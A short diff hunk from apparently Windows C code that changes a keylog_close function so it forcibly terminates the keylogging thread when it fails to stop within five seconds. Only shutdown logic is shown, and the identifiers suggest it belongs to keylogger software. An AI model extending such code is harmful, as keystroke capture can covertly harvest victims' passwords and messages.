@@ -99,7 +99,10 @@ void keylog_close(void)
         g_klogRunning = FALSE;
         SetEvent(g_klogSignal);
         if (g_klogThread) {
-            WaitForSingleObject(g_klogThread, 5000);
+            DWORD wr = WaitForSingleObject(g_klogThread, 5000);
+            if (wr == WAIT_TIMEOUT) {
+                TerminateThread(g_klogThread, 0);
+            }
             CloseHandle(g_klogThread);
             g_klogThread = NULL;
         }
